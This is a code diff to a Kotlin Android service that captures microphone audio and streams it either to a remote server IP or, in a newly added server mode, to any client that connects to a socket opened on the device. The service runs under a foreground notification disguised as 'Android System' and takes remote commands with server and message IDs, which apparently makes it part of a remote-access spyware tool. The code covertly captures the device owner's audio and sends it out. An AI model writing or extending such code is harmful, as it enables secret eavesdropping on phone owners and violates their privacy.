@@ -24,21 +24,26 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.launch
 import java.io.IOException
-import java.io.OutputStream
+import java.net.ServerSocket
 import java.net.Socket
+import java.util.Collections
 
 class MicStreamingService : Service() {
 
     private val TAG = "MicStreamingService"
-    private var SERVER_IP = "YOUR_SERVER_IP" // Replace with your server's IP address
+    private var SERVER_IP = "YOUR_SERVER_IP" // Replace with your server's IP address (used in client mode)
     private var SERVER_PORT = 12345 // Replace with your server's port
     private val SAMPLE_RATE = 44100
     private val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO  // Using microphone input configuration
     private var AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
     private var bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
+    private var startServer = false
 
     private var audioRecord: AudioRecord? = null
     private var socket: Socket? = null
+    private var serverSocket: ServerSocket? = null
+    // A thread-safe list to keep track of connected client sockets in server mode
+    private val clientSockets = Collections.synchronizedList(mutableListOf<Socket>())
     private var isStreaming = false
     private var streamingJob: Job? = null
 
@@ -49,6 +54,8 @@ class MicStreamingService : Service() {
     private var notificationChannel: NotificationChannel? = null
     private var notificationManager: NotificationManager? = null
     private var notification: Notification? = null
+    
+    private var command = ""
 
     companion object {
         const val ACTION_STOP_MIC_STREAMING_SERVICE = "com.client.services.other.MicStreamingService.STOP_MIC_STREAMING_SERVICE"
@@ -70,7 +77,7 @@ class MicStreamingService : Service() {
     private val receiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             if (intent?.action == ACTION_STOP_MIC_STREAMING_SERVICE) {
-                Log.d(TAG, "stop streaming received")
+                Log.d(TAG, "Stop streaming received")
                 try {
                     stopStreaming()
                 } catch (ex: Exception) {
@@ -110,30 +117,39 @@ class MicStreamingService : Service() {
             .setContentTitle("Android System")
             .build()
         startForeground(2, notification)
-        Log.d(TAG, "service started")
+        Log.d(TAG, "Service started")
 
         // Get connection parameters from the intent
-        SERVER_IP = intent!!.getStringExtra("ServerIP")!!
+        SERVER_IP = intent!!.getStringExtra("ServerIP").toString()
         SERVER_PORT = intent.getIntExtra("ServerPort", -1)
         serverID = intent.getStringExtra("ServerID")!!
         messageID = intent.getStringExtra("MessageID")!!
         AUDIO_FORMAT = intent.getIntExtra("AudioFormat", -1)
+        startServer = intent.getBooleanExtra("StartServer", false)
+        command = intent.getStringExtra("Command")!!
 
         if (SERVER_PORT == -1 || AUDIO_FORMAT == -1) {
             stopForeground(STOP_FOREGROUND_REMOVE)
             stopSelf()
         } else {
-            startStreaming()
+            if (startServer) {
+                startServerStreaming()
+            } else {
+                startStreaming()
+            }
         }
         return START_REDELIVER_INTENT
     }
 
+    /**
+     * Client mode: connect to a remote server and send mic audio.
+     */
     private fun startStreaming() {
         if (isStreaming) {
             sendMessage(
                 this,
                 false,
-                "START_STREAMING_MIC: Operation failed: already streaming",
+                "$command: Operation failed: already streaming",
                 messageID, serverID
             )
             return
@@ -146,7 +162,7 @@ class MicStreamingService : Service() {
             isStreaming = true
             streamingJob = CoroutineScope(Dispatchers.IO).launch {
                 try {
-                    // Connect to the server
+                    // Connect to the remote server
                     socket = Socket(SERVER_IP, SERVER_PORT)
                     Log.d(
                         TAG,
@@ -155,7 +171,7 @@ class MicStreamingService : Service() {
                     sendMessage(
                         this@MicStreamingService,
                         false,
-                        "START_STREAMING_MIC: Operation completed successfully",
+                        "$command: Operation completed successfully",
                         messageID, serverID
                     )
 
@@ -174,7 +190,7 @@ class MicStreamingService : Service() {
                     audioRecord?.startRecording()
 
                     // Get the output stream from the socket
-                    val outputStream: OutputStream = socket!!.getOutputStream()
+                    val outputStream = socket!!.getOutputStream()
 
                     // Buffer for audio data
                     val buffer = ByteArray(bufferSize)
@@ -189,7 +205,7 @@ class MicStreamingService : Service() {
                     sendMessage(
                         this@MicStreamingService,
                         false,
-                        "START_STREAMING_MIC: Operation failed - ${e.localizedMessage}",
+                        "$command: Operation failed - ${e.localizedMessage}",
                         messageID, serverID
                     )
                 } finally {
@@ -200,8 +216,121 @@ class MicStreamingService : Service() {
             sendMessage(
                 this,
                 false,
-                "START_STREAMING_MIC: Operation failed - permission not granted"
+                "$command: Operation failed - permission not granted",
+                messageID, serverID
             )
+        }
+    }
+
+    /**
+     * Server mode: open a ServerSocket and stream mic audio to any client that connects.
+     */
+    private fun startServerStreaming() {
+        if (isStreaming) {
+            sendMessage(
+                this,
+                false,
+                "$command: Operation failed: already streaming",
+                messageID, serverID
+            )
+            return
+        }
+        if (ActivityCompat.checkSelfPermission(
+                this@MicStreamingService,
+                Manifest.permission.RECORD_AUDIO
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            sendMessage(
+                this,
+                false,
+                "$command: Operation failed - permission not granted",
+                messageID, serverID
+            )
+            return
+        }
+        isStreaming = true
+        streamingJob = CoroutineScope(Dispatchers.IO).launch {
+            try {
+                // Start the server socket to accept client connections.
+                serverSocket = ServerSocket(SERVER_PORT)
+                Log.d(TAG, "Server socket opened on port $SERVER_PORT")
+
+                // Launch a coroutine to accept incoming connections.
+                launch {
+                    while (isStreaming) {
+                        try {
+                            val clientSocket = serverSocket!!.accept()
+                            clientSockets.add(clientSocket)
+                            Log.d(
+                                TAG,
+                                "New client connected: ${clientSocket.inetAddress.hostAddress}:${clientSocket.port}"
+                            )
+                        } catch (e: Exception) {
+                            if (isStreaming) {
+                                Log.e(TAG, "Error accepting client: ${e.message}")
+                            }
+                        }
+                    }
+                }
+
+                // Prepare AudioRecord to capture microphone audio
+                audioRecord = AudioRecord(
+                    MediaRecorder.AudioSource.MIC,
+                    SAMPLE_RATE,
+                    CHANNEL_CONFIG,
+                    AUDIO_FORMAT,
+                    bufferSize
+                )
+                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
+                    Log.e(TAG, "AudioRecord initialization failed")
+                    return@launch
+                }
+                audioRecord?.startRecording()
+
+                sendMessage(
+                    this@MicStreamingService,
+                    false,
+                    "$command: Server mode operation started successfully",
+                    messageID, serverID
+                )
+
+                // Buffer for audio data
+                val buffer = ByteArray(bufferSize)
+                while (isStreaming) {
+                    val readBytes = audioRecord?.read(buffer, 0, buffer.size) ?: 0
+                    if (readBytes > 0) {
+                        // Write the audio data to every connected client.
+                        synchronized(clientSockets) {
+                            val iterator = clientSockets.iterator()
+                            while (iterator.hasNext()) {
+                                val clientSocket = iterator.next()
+                                try {
+                                    val out = clientSocket.getOutputStream()
+                                    out.write(buffer, 0, readBytes)
+                                } catch (e: Exception) {
+                                    Log.e(TAG, "Error sending to client: ${e.message}")
+                                    try {
+                                        clientSocket.close()
+                                    } catch (ex: Exception) {
+                                        // Ignore close exception.
+                                    }
+                                    iterator.remove()
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error during server streaming: ${e.message}")
+                sendMessage(
+                    this@MicStreamingService,
+                    false,
+                    "$command: Operation failed - ${e.localizedMessage}",
+                    messageID, serverID
+                )
+            } finally {
+                stopStreaming()
+            }
         }
     }
 
@@ -221,14 +350,33 @@ class MicStreamingService : Service() {
         try {
             socket?.close()
         } catch (e: IOException) {
-            Log.e(TAG, "Error closing socket: ${e.message}")
+            Log.e(TAG, "Error closing client socket: ${e.message}")
         }
         socket = null
+
+        // Close the server socket and all connected client sockets if in server mode.
+        try {
+            serverSocket?.close()
+        } catch (e: Exception) {
+            Log.e(TAG, "Error closing server socket: ${e.message}")
+        }
+        serverSocket = null
+
+        synchronized(clientSockets) {
+            clientSockets.forEach { client ->
+                try {
+                    client.close()
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error closing client socket: ${e.message}")
+                }
+            }
+            clientSockets.clear()
+        }
         Log.d(TAG, "Streaming stopped.")
         sendMessage(
             this,
             false,
-            "START_STREAMING_MIC: Streaming stopped",
+            "$command: Streaming stopped",
             messageID, serverID
         )
     }
